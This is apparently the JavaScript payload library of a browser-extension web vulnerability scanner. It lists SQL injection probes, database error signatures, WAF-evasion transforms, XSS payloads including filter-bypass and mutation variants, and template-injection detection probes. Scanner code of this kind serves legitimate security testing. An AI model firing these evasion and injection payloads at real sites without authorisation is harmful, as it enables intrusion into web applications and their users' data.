/* Aegis Lens payload library — ported from the aegis Python scanner,
   plus UNION-based SQLi and SSTI probes. Loaded into the service worker
   via importScripts. */
"use strict";

/* ------------------------------------------------------------------ */
/* SQLi                                                                */
/* ------------------------------------------------------------------ */

const ERROR_PROBES = [
  "'", '"', "')", '")', "'))",
  "' OR '1'='1", '" OR "1"="1', "' OR 1=1-- -",
  // community 2026-09: auth-bypass tautology w/ row cap (HackerDNA lab writeup)
  "' OR 1=1 limit 1-- ",
];

const BOOLEAN_PAIRS = [
  ["' AND '1'='1", "' AND '1'='2"],
  ["' AND 1=1-- -", "' AND 1=2-- -"],
  ['" AND "1"="1', '" AND "1"="2'],
  ["' AND 1=1#", "' AND 1=2#"],
  // community 2026-09-28: strcmp() synonym-function blind oracle (OWASP
  // WAF-bypass notes) — catches filters that signature-block ascii()/mid().
  // DB-agnostic: only MySQL evaluates strcmp, others behave identically.
  ["' AND strcmp(left('aegis',1),'a')=0-- -", "' AND strcmp(left('aegis',1),'a')=1-- -"],
];

// canary-based UNION confirmation: {cols, build(canary)}
const UNION_PROBES = [
  { cols: 1, build: (c) => `' UNION SELECT '${c}'-- -` },
  { cols: 2, build: (c) => `' UNION SELECT '${c}','${c}2'-- -` },
];

// probes that get the evasion treatment on pass 2
const EVADE_BASE = ["'", '"', "')"];

const ERROR_SIGS = [
  [/you have an error in your sql syntax/i, "MySQL"],
  [/warning:\s*mysql/i, "MySQL"],
  [/mysqli?_[a-z_]+\(\)/i, "MySQL"],
  [/valid mysql result/i, "MySQL"],
  [/mysql server version/i, "MySQL"],
  [/mariadb server version/i, "MariaDB"],
  [/pg_query\(\)|pg_exec\(\)/i, "PostgreSQL"],
  [/unterminated quoted string/i, "PostgreSQL"],
  [/postgresql.+error/i, "PostgreSQL"],
  [/warning.+pg_/i, "PostgreSQL"],
  [/unclosed quotation mark/i, "MSSQL"],
  [/microsoft ole db provider for sql server/i, "MSSQL"],
  [/odbc sql server driver/i, "MSSQL"],
  [/ora-01756|ora-00933|quoted string not properly terminated/i, "Oracle"],
  [/oracle error/i, "Oracle"],
  [/sqlite3?::|sqlite error/i, "SQLite"],
  [/near .+ syntax error/i, "SQLite"],
  [/xpathexception|invalid xpath/i, "XPath"],
  [/ldapexception|supplied argument is not a valid ldap/i, "LDAP"],
  [/sql syntax/i, "Generic"],
  [/database error/i, "Generic"],
  [/db error/i, "Generic"],
  [/syntax error.+query/i, "Generic"],
];

/* ---------------- WAF-evasion transforms (ported from aegis) -------- */

const TRANSFORMS = {
  randomcase: (p) => [...p].map((c) => (Math.random() < 0.5 ? c.toUpperCase() : c.toLowerCase())).join(""),
  space2comment: (p) => p.replace(/ /g, "/**/"),
  tabspace: (p) => p.replace(/ /g, "\t"),
  newlinespace: (p) => p.replace(/ /g, "\n"),
  charencode: (p) =>
    [...p].map((c) => (/[a-zA-Z0-9]/.test(c) ? c : "%" + c.charCodeAt(0).toString(16).toUpperCase().padStart(2, "0"))).join(""),
  doubleencode: (p) => TRANSFORMS.charencode(p).replace(/%/g, "%25"),
  "versioned-comments": (p) =>
    p.replace(/\b(UNION|SELECT|AND|OR|FROM|WHERE|SLEEP)\b/gi, (m) => `/*!50000${m.toUpperCase()}*/`),
  nullbyte: (p) => p + "%00",
  "keyword-split": (p) => {
    const pairs = [["UNION", "UN/**/ION"], ["SELECT", "SEL/**/ECT"], ["AND", "A/**/ND"], ["OR", "O/**/R"],
                   ["FROM", "F/**/ROM"], ["WHERE", "W/**/HERE"], ["SLEEP", "SL/**/EEP"]];
    let out = p;
    for (const [kw, split] of pairs) out = out.replace(new RegExp(`\\b${kw}\\b`, "gi"), split);
    return out;
  },
  // community 2026-09: Claroty/Noam Moshe JSON-syntax WAF blind — WAFs that
  // can't parse JSON fail open on JSON-wrapped SQLi. Cheap to test, harmless.
  jsonwrap: (p) => `{"a":"${p}"}`,
  // community 2026-09: XML hex-entity keyword encoding (PortSwigger lab
  // writeups) — hides SQL keywords from pattern-matching filters.
  xmlentities: (p) => {
    const hex = (s) => [...s].map((c) => `&#x${c.charCodeAt(0).toString(16)};`).join("");
    return p.replace(/\b(UNION|SELECT|AND|OR|FROM|WHERE|SLEEP)\b/gi, (m) => hex(m));
  },
  // community 2026-09-28: XML decimal-entity keyword encoding (PortSwigger
  // "filter bypass via XML encoding" lab writeups, Sep 2026) — filters that
  // normalize hex entities still miss the decimal form.
  "xmlentities-dec": (p) => {
    const dec = (s) => [...s].map((c) => `&#${c.charCodeAt(0)};`).join("");
    return p.replace(/\b(UNION|SELECT|AND|OR|FROM|WHERE|SLEEP)\b/gi, (m) => dec(m));
  },
};

const LEVEL_TRANSFORMS = {
  1: [],
  2: ["randomcase", "space2comment", "tabspace", "charencode"],
  3: ["randomcase", "space2comment", "tabspace", "newlinespace", "charencode",
      "doubleencode", "versioned-comments", "nullbyte", "keyword-split",
      "jsonwrap", "xmlentities", "xmlentities-dec"],
};

/* encodeURIComponent that preserves intentional %XX sequences from transforms */
function enc(v) {
  return encodeURIComponent(v).replace(/%25([0-9A-Fa-f]{2})/g, "%$1");
}

/* ------------------------------------------------------------------ */
/* XSS — full 22-probe catalogue from aegis                             */
/* ------------------------------------------------------------------ */

// {name, template ({C} = canary), kinds: subset of tag/js}
const XSS_PROBES = [
  { name: "html-script", t: "<script>{C}</script>", kinds: ["tag"] },
  { name: "html-svg", t: "<svg onload={C}>", kinds: ["tag"] },
  { name: "html-svg-quoted", t: '<svg onload="{C}">', kinds: ["tag"] },
  { name: "html-img", t: "<img src=x onerror={C}>", kinds: ["tag"] },
  { name: "html-details", t: "<details open ontoggle={C}>", kinds: ["tag"] },
  { name: "html-body", t: "<body onload={C}>", kinds: ["tag"] },
  { name: "html-iframe", t: '<iframe srcdoc="<svg onload={C}>">', kinds: ["tag"] },
  { name: "html-video", t: "<video><source onerror={C}>", kinds: ["tag"] },
  { name: "attr-dquote", t: '"><svg onload={C}>', kinds: ["tag"] },
  { name: "attr-squote", t: "'><svg onload={C}>", kinds: ["tag"] },
  { name: "attr-nospace", t: '"><svg/onload={C}>', kinds: ["tag"] },
  { name: "js-squote", t: "';{C};//", kinds: ["js"] },
  { name: "js-dquote", t: '";{C};//', kinds: ["js"] },
  { name: "js-template", t: "${" + "{C}" + "}", kinds: ["js"] },
  { name: "js-backtick", t: "`;{C};//", kinds: ["js"] },
  { name: "script-close", t: "</script><svg onload={C}>", kinds: ["tag", "js"] },
  { name: "evade-case", t: "<ScRiPt>{C}</ScRiPt>", kinds: ["tag"] },
  { name: "evade-nested", t: "<scr<script>ipt>{C}</scr</script>ipt>", kinds: ["tag"] },
  { name: "evade-nospace", t: "<svg/onload={C}>", kinds: ["tag"] },
  { name: "evade-tab", t: "<svg\tonload={C}>", kinds: ["tag"] },
  { name: "evade-entity", t: "&#x3c;svg onload={C}&#x3e;", kinds: ["tag"] },
  { name: "evade-comment", t: "<!--><svg onload={C}>", kinds: ["tag"] },
  // --- community additions 2026-09 (cheatsheet / writeup roundup) ---
  { name: "html-marquee", t: "<marquee onstart={C}>", kinds: ["tag"] },
  { name: "html-video-err", t: "<video src=x onerror={C}>", kinds: ["tag"] },
  { name: "html-audio", t: "<audio src=x onerror={C}>", kinds: ["tag"] },
  { name: "html-input-focus", t: "<input onfocus={C} autofocus>", kinds: ["tag"] },
  { name: "html-math-nest", t: "<math><mtext><table><mglyph><style><img src=x onerror={C}>", kinds: ["tag"] },
  // --- community additions 2026-09-28 (web-indexed writeup roundup) ---
  // SVG <animate> href hijack: bypasses filters blocking both event handlers
  // and href attributes (PortSwigger XSS lab writeup, Sep 2026).
  { name: "svg-animate-href", t: '<svg><a><animate attributeName="href" values="javascript:{C}"/><text x="20" y="20">click</text></a></svg>', kinds: ["tag"] },
  // <noscript> mutation XSS: parser keeps the <p> inert until </noscript>, so
  // the trailing <img onerror> becomes a live element (SafePaste mXSS writeup).
  { name: "mxss-noscript", t: '<noscript><p title="x</noscript><img src=x onerror={C}>', kinds: ["tag"] },
];

const XSS_LEVEL_CUTOFF = { 1: 16, 2: 20, 3: 29 };

/* ------------------------------------------------------------------ */
/* SSTI — distinctive-math probes (detection only)                     */
/* ------------------------------------------------------------------ */

const SSTI_FACTOR_A = 1337, SSTI_FACTOR_B = 7331;
const SSTI_EXPECTED = String(SSTI_FACTOR_A * SSTI_FACTOR_B); // 9801547
const SSTI_EXPECTED_ALT = "7777777"; // {{7*'7'}} — Jinja2 string repeat (not Twig)
const SSTI_PROBES = [
  `{{${SSTI_FACTOR_A}*${SSTI_FACTOR_B}}}`,
  `\${${SSTI_FACTOR_A}*${SSTI_FACTOR_B}}`,
  // community 2026-09: more engine fingerprints
  `<%=${SSTI_FACTOR_A}*${SSTI_FACTOR_B}%>`, // ERB / EJS
  `#{${SSTI_FACTOR_A}*${SSTI_FACTOR_B}}`,   // Mako / Pebble
  `*{${SSTI_FACTOR_A}*${SSTI_FACTOR_B}}`,   // Thymeleaf
  `{{7*'7'}}`,                              // Jinja2-vs-Twig distinguisher
  // community 2026-09-28: {% %} tag evaluation (Django-family, Pongo2/Go
  // templates per Nullcon 2026 research) — reuses SSTI_EXPECTED, so no
  // background.js change is needed.
  `{% if ${SSTI_FACTOR_A}*${SSTI_FACTOR_B}==${SSTI_EXPECTED} %}${SSTI_EXPECTED}{% endif %}`,
];

/* ------------------------------------------------------------------ */
/* Scan planning (progress bar)                                         */
/* ------------------------------------------------------------------ */

function planCounts(nParams, opts, level) {
  const lv = Math.min(Math.max(level || 1, 1), 3);
  let per = 1; // baseline
  if (opts.sqli) {
    per += ERROR_PROBES.length + BOOLEAN_PAIRS.length * 2 + UNION_PROBES.length;
    if (lv >= 2) per += EVADE_BASE.length * LEVEL_TRANSFORMS[lv].length;
  }
  if (opts.xss) per += XSS_PROBES.slice(0, XSS_LEVEL_CUTOFF[lv]).length;
  if (opts.ssti) per += SSTI_PROBES.length;
  let total = nParams * per;
  if (opts.headers || opts.cve) total += 1; // shared page fetch
  if (opts.cve) total += 5; // exposed-path probes
  return total;
}
